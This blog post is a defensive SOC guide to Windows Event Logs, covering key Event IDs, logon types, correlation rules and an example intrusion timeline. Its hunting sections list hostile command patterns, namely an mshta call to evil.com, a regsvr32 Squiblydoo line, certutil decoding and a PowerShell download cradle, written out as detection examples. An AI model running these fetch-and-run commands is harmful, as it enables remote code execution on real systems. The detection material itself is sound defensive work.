---
title: "Windows Event Logs: The SOC Analyst's Best Friend"
date: 2026-02-25 08:00:00 +0300
categories: [Cybersecurity, SOC]
tags: [windows event logs, soc, threat detection, incident response, siem, blue team, log analysis]
author: Ongalo Glenn
description: A practical guide to Windows Event Logs — the Event IDs that matter most, what they tell you, and how SOC analysts use them to detect threats and investigate incidents.
---

## Introduction

If you work in a Security Operations Centre, Windows Event Logs are your daily companion. Nearly every action on a Windows system — a user logging in, a process starting, a service being installed, a firewall rule changing — generates an event log entry. For a SOC analyst, that paper trail is gold.

The challenge is not availability — Windows generates thousands of log entries per hour. The challenge is knowing **which events matter**, **what they mean**, and **how to connect them** into a coherent picture of what happened on a system.

This post breaks down the Windows Event Logging system, the Event IDs every SOC analyst should know by heart, and how to use them to detect real threats.

---

## How Windows Event Logging Works

Windows stores logs in structured files called **Event Log files** (`.evtx`), accessible through the **Event Viewer** application or programmatically via PowerShell and SIEM tools.

Logs are organised into channels:

| Log Channel | What It Contains |
|---|---|
| **Security** | Authentication, authorisation, policy changes |
| **System** | OS-level events, service changes, hardware |
| **Application** | Software-specific events |
| **Sysmon** | Advanced process, network, and file events (requires installation) |

For SOC work, the **Security** log is your primary focus — it contains the events most relevant to threat detection and incident investigation.

Each event contains:
- **Event ID** — a numeric code identifying the event type
- **Timestamp** — when it occurred
- **Source** — which component generated it
- **Account information** — which user was involved
- **Additional details** — specific to each event type

---

## The Event IDs Every SOC Analyst Must Know

### Authentication Events

#### Event ID 4624 — Successful Logon

This fires every time a user successfully logs into a Windows system. The critical field is the **Logon Type**, which tells you *how* they logged in:

| Logon Type | Description | SOC Significance |
|---|---|---|
| 2 | Interactive (local keyboard) | Normal workstation login |
| 3 | Network (file share, mapped drive) | Common for lateral movement |
| 4 | Batch (scheduled task) | Could indicate persistence |
| 5 | Service | Service account activity |
| 10 | RemoteInteractive (RDP) | Remote desktop — monitor closely |
| 11 | CachedInteractive | Offline login with cached creds |

**What to look for:**
- Type 10 logins (RDP) from unusual source IPs
- Type 3 logins to systems a user doesn't normally access — lateral movement indicator
- Logins outside business hours from privileged accounts

---

#### Event ID 4625 — Failed Logon

A single failed logon is normal. Dozens in quick succession is a **brute force attack**.

**What to look for:**
- Multiple 4625 events for the same account in a short timeframe — password spraying or brute force
- 4625 events followed by a 4624 — attacker succeeded after trying
- Failed logons against accounts that don't exist — username enumeration

```
Correlation rule: 10+ Event ID 4625 on a single account within 5 minutes = brute force alert
```

---

#### Event ID 4648 — Logon Attempt with Explicit Credentials

This fires when a process logs on using explicitly provided credentials — for example, running `runas` or using `net use` with a username and password. Legitimate administrators do this, but so do attackers pivoting across systems.

**What to look for:**
- 4648 originating from unusual processes (e.g. `cmd.exe`, `powershell.exe`)
- 4648 events targeting multiple different systems — credential-based lateral movement

---

#### Event ID 4634 / 4647 — Logoff

Tracks when sessions end. Useful for building a timeline of how long an attacker maintained access.

---

### Account Management Events

#### Event ID 4720 — User Account Created

A new user account was created. In most environments, account creation is a controlled, infrequent event.

**What to look for:**
- Accounts created outside of change management windows
- Accounts created by non-admin users or unusual processes
- Accounts with generic names (`svc_backup`, `support`, `helpdesk`) created without a ticket

---

#### Event ID 4732 — Member Added to Security-Enabled Local Group

**Event ID 4728** covers domain groups. These events fire when a user is added to a group — the most sensitive being the **Administrators** group.

**What to look for:**
- Any addition to the local Administrators group — especially by a non-admin account
- New accounts added to privileged groups immediately after creation (4720 → 4732 chain)

> **Key insight:** The sequence 4720 (account created) → 4732 (added to Administrators) is a classic attacker persistence pattern — creating a backdoor admin account.

---

#### Event ID 4723 / 4724 — Password Change / Reset

4723 fires when a user changes their own password. 4724 fires when an admin resets someone else's password.

**What to look for:**
- Password resets on privileged accounts outside of normal business hours
- A compromised account resetting passwords of other accounts — account takeover in progress

---

### Process & Execution Events

#### Event ID 4688 — New Process Created

Every time a new process starts, Windows logs it here — including the **process name**, **creator**, and (if configured) the **full command line**. This is one of the most valuable events for detecting malicious activity.

> ⚠️ **Important:** Command line logging is disabled by default. Enable it via Group Policy: `Computer Configuration → Administrative Templates → System → Audit Process Creation → Include command line in process creation events`

**Suspicious process patterns to hunt:**

```
# Malicious macro spawning PowerShell
Parent: WINWORD.EXE → Child: powershell.exe

# Living-off-the-land binaries (LOLBins)
certutil.exe -decode           # decoding malware
mshta.exe http://evil.com      # remote HTA execution
regsvr32.exe /s /n /i:http://  # Squiblydoo technique
wscript.exe suspicious.vbs     # script execution

# Recon commands shortly after initial access
whoami /all
net localgroup administrators
ipconfig /all
netstat -an
```

---

#### Event ID 4104 — PowerShell Script Block Logging

When PowerShell Script Block Logging is enabled, Windows logs the **full content of every PowerShell script** that executes — even obfuscated ones, because Windows logs the decoded version.

**What to look for:**
- Base64 encoded commands: `-EncodedCommand` flag
- Download cradles: `IEX (New-Object Net.WebClient).DownloadString`
- Invocation of offensive tools: `Invoke-Mimikatz`, `Invoke-BloodHound`

---

### Privilege & Policy Events

#### Event ID 4672 — Special Privileges Assigned to New Logon

Fires when an account with admin-level privileges logs on. Useful for tracking privileged account usage.

**What to look for:**
- Privileged logons at unusual hours
- Service accounts with SeDebugPrivilege — often abused by credential dumping tools like Mimikatz

---

#### Event ID 4698 — Scheduled Task Created

Attackers frequently use scheduled tasks for persistence — ensuring their malware runs again after a reboot.

**What to look for:**
- Tasks created by non-admin users
- Tasks pointing to files in `%Temp%`, `%AppData%`, or unusual paths
- Tasks with names mimicking legitimate Windows tasks (e.g. `WindowsDefenderUpdate`)

---

### Service Events

#### Event ID 7045 — New Service Installed (System Log)

A new service was installed on the system. Legitimate software installs services, but so do attackers seeking persistence.

**What to look for:**
- Services with random or gibberish names
- Services pointing to executables in temp directories
- Services installed by non-admin users or outside change windows

---

### Object Access Events

#### Event ID 4663 — Object Access Attempt

Tracks access to files, folders, and registry keys — when auditing is enabled on those objects.

**What to look for:**
- Mass file access events on a file server (ransomware pre-encryption behaviour)
- Access to sensitive files (HR data, finance, credentials) by unusual accounts
- Registry key access to credential stores (`SAM`, `SECURITY`, `SYSTEM` hives)

---

## Building Attack Timelines with Event Logs

Individual events are clues — the real value comes from **correlating them into a timeline**. Here's an example of what a typical intrusion looks like in the logs:

```
14:23:01  4625 - Failed logon for 'administrator' from 192.168.1.105  [brute force attempt]
14:23:01  4625 - Failed logon for 'administrator' from 192.168.1.105
14:23:02  4625 - Failed logon for 'administrator' from 192.168.1.105
14:23:04  4624 - Successful logon for 'administrator' (Type 10 - RDP)  [access gained]
14:23:10  4672 - Special privileges assigned to 'administrator'
14:24:33  4688 - New process: cmd.exe (parent: explorer.exe)
14:24:40  4688 - New process: whoami.exe (parent: cmd.exe)           [reconnaissance]
14:24:45  4688 - New process: net.exe "localgroup administrators"    [recon continues]
14:25:12  4720 - New user account created: 'svc_helpdesk'           [persistence]
14:25:13  4732 - 'svc_helpdesk' added to Administrators group        [privilege escalation]
14:26:01  4698 - Scheduled task created: 'WindowsUpdateHelper'      [persistence]
```

From these logs alone, a SOC analyst can reconstruct: brute force → RDP access → reconnaissance → backdoor account creation → persistence via scheduled task. A complete attack story, all from Windows Event Logs.

---

## Practical Tips for SOC Analysts

**1. Enable what's disabled by default**  
Several critical audit policies are off by default. Enable these via Group Policy:
- Process creation audit with command line (4688)
- PowerShell Script Block Logging (4104)
- Object access auditing on sensitive shares

**2. Forward logs to a SIEM**  
Raw Event Viewer doesn't scale. Use Windows Event Forwarding (WEF) or a SIEM agent (Splunk Universal Forwarder, Elastic Agent) to centralise logs for correlation and alerting.

**3. Know your baseline**  
Anomaly detection only works if you know what normal looks like. Learn your environment — which accounts use RDP, which systems run scheduled tasks, what processes are expected on each system type.

**4. Prioritise by Logon Type**  
Not all 4624 events deserve equal attention. Type 10 (RDP) and Type 3 (network) to sensitive systems should be monitored more closely than interactive workstation logins.

**5. Chain events together**  
The story is in the sequence, not the individual event. Build queries that look for event chains — 4625 followed by 4624, or 4720 followed by 4732.

---

## Quick Reference Cheat Sheet

| Event ID | Log | Description | SOC Priority |
|---|---|---|---|
| 4624 | Security | Successful logon | 🟡 Medium |
| 4625 | Security | Failed logon | 🟡 Medium (🔴 High if repeated) |
| 4648 | Security | Explicit credential logon | 🟠 High |
| 4672 | Security | Privileged logon | 🟡 Medium |
| 4688 | Security | New process created | 🟠 High |
| 4698 | Security | Scheduled task created | 🔴 Critical |
| 4720 | Security | User account created | 🔴 Critical |
| 4732 | Security | Added to admin group | 🔴 Critical |
| 4104 | PowerShell | Script block logged | 🔴 Critical |
| 7045 | System | New service installed | 🔴 Critical |

---

## Final Thoughts

Windows Event Logs are not exciting to look at — they are dense, high-volume, and full of noise. But buried in that noise is the evidence of every attack, every intrusion attempt, and every unauthorised action taken on your systems.

The analysts who can cut through that noise quickly — who know which Event IDs to look for, how to chain them into timelines, and how to spot what doesn't belong — are the ones who catch attackers before they reach their objectives.

This is one of the core skills I am actively building as I work toward my SOC Analyst role. Every lab, every module, and every write-up like this one brings me closer to being ready for real-world alert triage.

---

*Found this helpful? Connect with me on [LinkedIn](https://www.linkedin.com/in/ongalo-glenn) or explore more write-ups on this site.*
